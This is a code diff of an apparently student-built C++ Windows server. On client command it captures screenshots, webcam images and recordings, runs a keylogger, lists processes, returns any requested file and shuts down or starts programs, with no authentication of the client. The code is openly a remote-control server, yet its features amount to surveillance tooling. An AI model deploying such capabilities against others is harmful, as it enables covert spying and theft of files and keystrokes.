@@ -1,93 +1,34 @@
 #include "../Application/lib.h"
 #include "../Application/executeCommand.h"
+#include "../Application/sendFile.h"
 
-const string saveDir = "C:/Users/Tien/Documents/Client-Server/";
-const int BUFFER_SIZE = 8192;  // Tăng buffer size
+const string saveDir = "C:/MMT/";
 
-std::map<std::string, std::function<void(std::string &)>> commandHandlers = {
-    {"get_screenshot",
-     [](std::string &outFile) {
-       outFile = saveDir + "screenshot.png";
-       take_screenshot(outFile);
-     }},
-    {"get_picture",
-     [](std::string &outFile) {
-       outFile = saveDir + "picture.png";
-       take_picture(outFile);
-     }},
-    {"list_program",
-     [](std::string &outFile) {
-       outFile = saveDir + "programs.txt";
-       list_programs_to_file(outFile);
-     }},
-    {"list_process",
-     [](std::string &outFile) {
-       outFile = saveDir + "processes.txt";
-       list_processes_to_file(outFile);
-     }},
-    {"get_recording",
-     [](std::string &outFile) {
-       outFile = saveDir + "recording.avi";
-       run_recording_and_save(outFile, 10);
-     }},
-    {"keylogger", [](std::string &outFile) {
-       outFile = saveDir + "keylog.txt";
-       run_keylogger_and_save(outFile, 10);
-     }}};
+// Các command cần tạo file output
+std::map<std::string, std::string> fileCommands = {
+    {"get_screenshot", saveDir + "screenshot.png"},
+    {"get_picture", saveDir + "picture.png"},
+    {"list_program", saveDir + "running_programs.txt"},
+    {"list_process", saveDir + "processes_with_pid.txt"},
+    {"list_installed", saveDir + "installed_programs.txt"},
+    {"get_recording", saveDir + "recording.avi"},
+    {"keylogger", saveDir + "keylog.txt"}  // Thêm keylogger vào fileCommands
+};
 
-// Cải thiện hàm send file với error handling và progress
-bool send_file_over_socket(SOCKET sock, const std::string &filename) {
-  std::ifstream file(filename, std::ios::binary);
-  if (!file) {
-    std::cout << "[ERROR] Cannot open file: " << filename << std::endl;
-    size_t fileSize = 0;
-    send(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize), 0);
-    return false;
-  }
+// Các command không cần tạo file nhưng cần confirmation
+std::set<std::string> simpleCommands = {"shutdown", "restart",
+                                        "cancel_shutdown"};
 
-  file.seekg(0, std::ios::end);
-  size_t fileSize = file.tellg();
-  file.seekg(0, std::ios::beg);
-
-  std::cout << "[INFO] Sending file: " << filename << " (" << fileSize
-            << " bytes)" << std::endl;
-
-  // Gửi file size trước
-  if (send(sock, reinterpret_cast<const char *>(&fileSize), sizeof(fileSize),
-           0) == SOCKET_ERROR) {
-    std::cout << "[ERROR] Failed to send file size" << std::endl;
-    return false;
-  }
-
-  // Gửi data với buffer lớn hơn
-  std::vector<char> buffer(BUFFER_SIZE);
-  size_t totalSent = 0;
-
-  while (file && totalSent < fileSize) {
-    file.read(buffer.data(), BUFFER_SIZE);
-    std::streamsize bytesRead = file.gcount();
-
-    if (bytesRead > 0) {
-      int result = send(sock, buffer.data(), static_cast<int>(bytesRead), 0);
-      if (result == SOCKET_ERROR) {
-        std::cout << "[ERROR] Send failed at byte: " << totalSent << std::endl;
-        return false;
-      }
-      totalSent += result;
-
-      // Progress cho file lớn
-      if (fileSize > 1024 * 1024 && totalSent % (1024 * 1024) == 0) {
-        std::cout << "[PROGRESS] Sent: " << (totalSent / (1024 * 1024)) << " MB"
-                  << std::endl;
-      }
-    }
-  }
-
-  std::cout << "[SUCCESS] File sent: " << totalSent << " bytes" << std::endl;
-  return true;
+bool is_start_program_command(const std::string& command) {
+  return command.find("start_program") == 0;
 }
 
-// Cải thiện receive message
+// Function để check xem command có phải là keylogger với thời gian
+bool is_keylogger_command(const std::string& command) {
+  return command.find("keylogger") == 0;
+}
+
+// Nhận message từ client
 std::string receive_command(SOCKET sock) {
   char buffer[4096] = {};
   int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
@@ -100,14 +41,14 @@ std::string receive_command(SOCKET sock) {
   return std::string(buffer);
 }
 
-static std::string trim(const std::string &s) {
+static std::string trim(const std::string& s) {
   size_t a = s.find_first_not_of(" \r\n\t");
   if (a == std::string::npos) return "";
   size_t b = s.find_last_not_of(" \r\n\t");
   return s.substr(a, b - a + 1);
 }
 
-// Xử lý client với error handling tốt hơn
+// Xử lý client - server chỉ thực thi và gửi kết quả
 void handle_client(SOCKET clientSocket) {
   std::cout << "[Connection] Client connected" << std::endl;
 
@@ -127,45 +68,87 @@ void handle_client(SOCKET clientSocket) {
     sender_email = trim(sender_email);
     command = trim(command);
 
-    std::cout << "[Server] Command from " << sender_email << ": " << command
-              << std::endl;
+    std::cout << "[Server] Processing command: " << command << std::endl;
 
     // Xử lý send_file với path cụ thể
     if (command.find("send_file") == 0) {
       std::string filepath = command.substr(9);
       filepath = trim(filepath);
 
-      if (!filepath.empty()) {
+      if (!filepath.empty() && std::filesystem::exists(filepath)) {
+        std::cout << "[Server] Sending file: " << filepath << std::endl;
         send_file_over_socket(clientSocket, filepath);
       } else {
-        std::cout << "[Error] No file path provided" << std::endl;
+        std::cout << "[Error] File not found: " << filepath << std::endl;
         size_t fileSize = 0;
-        send(clientSocket, reinterpret_cast<const char *>(&fileSize),
+        send(clientSocket, reinterpret_cast<const char*>(&fileSize),
              sizeof(fileSize), 0);
       }
     }
-    // Xử lý các command có sẵn
-    else if (commandHandlers.count(command)) {
-      std::string outputFile;
-      commandHandlers[command](outputFile);
+    // Xử lý keylogger (có thể có tham số thời gian)
+    else if (is_keylogger_command(command)) {
+      std::string outputFile = fileCommands["keylogger"];
 
-      if (!send_file_over_socket(clientSocket, outputFile)) {
-        std::cout << "[Error] Failed to send result file" << std::endl;
+      std::filesystem::create_directories(
+          std::filesystem::path(outputFile).parent_path());
+
+      // Thực thi keylogger command với file output
+      execute_command_with_file(command, outputFile);
+
+      // Gửi file cho client
+      if (std::filesystem::exists(outputFile)) {
+        std::cout << "[Server] Sending keylogger result: " << outputFile
+                  << std::endl;
+        send_file_over_socket(clientSocket, outputFile);
+      } else {
+        std::cout << "[Error] Failed to generate keylog file" << std::endl;
+        size_t fileSize = 0;
+        send(clientSocket, reinterpret_cast<const char*>(&fileSize),
+             sizeof(fileSize), 0);
       }
     }
-    // Execute command thông thường
-    else {
-      execute_command_with_sender(sender_email, command);
+    // Xử lý các command khác tạo file
+    else if (fileCommands.count(command)) {
+      std::string outputFile = fileCommands[command];
+
+      std::filesystem::create_directories(
+          std::filesystem::path(outputFile).parent_path());
+
+      execute_command_with_file(command, outputFile);
+
+      if (std::filesystem::exists(outputFile)) {
+        std::cout << "[Server] Sending result file: " << outputFile
+                  << std::endl;
+        send_file_over_socket(clientSocket, outputFile);
+      } else {
+        std::cout << "[Error] Failed to generate output file: " << outputFile
+                  << std::endl;
+        size_t fileSize = 0;
+        send(clientSocket, reinterpret_cast<const char*>(&fileSize),
+             sizeof(fileSize), 0);
+      }
+    }
+    // Xử lý các command đơn giản (shutdown, restart, start_program)
+    else if (simpleCommands.count(command) ||
+             is_start_program_command(command)) {
+      execute_command(command);
 
       // Gửi confirmation message
       std::string confirmMsg = "Command executed: " + command;
       size_t msgSize = confirmMsg.length();
-      send(clientSocket, reinterpret_cast<const char *>(&msgSize),
+      send(clientSocket, reinterpret_cast<const char*>(&msgSize),
            sizeof(msgSize), 0);
       send(clientSocket, confirmMsg.c_str(), static_cast<int>(msgSize), 0);
+    } else {
+      // Unknown command
+      std::string errorMsg = "Unknown command: " + command;
+      size_t msgSize = errorMsg.length();
+      send(clientSocket, reinterpret_cast<const char*>(&msgSize),
+           sizeof(msgSize), 0);
+      send(clientSocket, errorMsg.c_str(), static_cast<int>(msgSize), 0);
     }
 
-  } catch (const std::exception &e) {
+  } catch (const std::exception& e) {
     std::cout << "[Error] Exception: " << e.what() << std::endl;
   }
 
@@ -192,14 +175,14 @@ int main() {
   // Set socket option để reuse address
   int optval = 1;
   setsockopt(serverSocket, SOL_SOCKET, SO_REUSEADDR,
-             reinterpret_cast<const char *>(&optval), sizeof(optval));
+             reinterpret_cast<const char*>(&optval), sizeof(optval));
 
   sockaddr_in serverAddr{};
   serverAddr.sin_family = AF_INET;
   serverAddr.sin_port = htons(8888);
   serverAddr.sin_addr.s_addr = INADDR_ANY;
 
-  if (bind(serverSocket, (sockaddr *)&serverAddr, sizeof(serverAddr)) ==
+  if (bind(serverSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) ==
       SOCKET_ERROR) {
     std::cout << "[Error] Bind failed" << std::endl;
     closesocket(serverSocket);
@@ -220,14 +203,14 @@ int main() {
     sockaddr_in clientAddr{};
     int clientSize = sizeof(clientAddr);
     SOCKET clientSocket =
-        accept(serverSocket, (sockaddr *)&clientAddr, &clientSize);
+        accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
 
     if (clientSocket == INVALID_SOCKET) {
       std::cout << "[Warning] Accept failed" << std::endl;
       continue;
     }
 
-    // Xử lý client - có thể thêm thread ở đây nếu cần
+    // Xử lý client
     handle_client(clientSocket);
   }
 
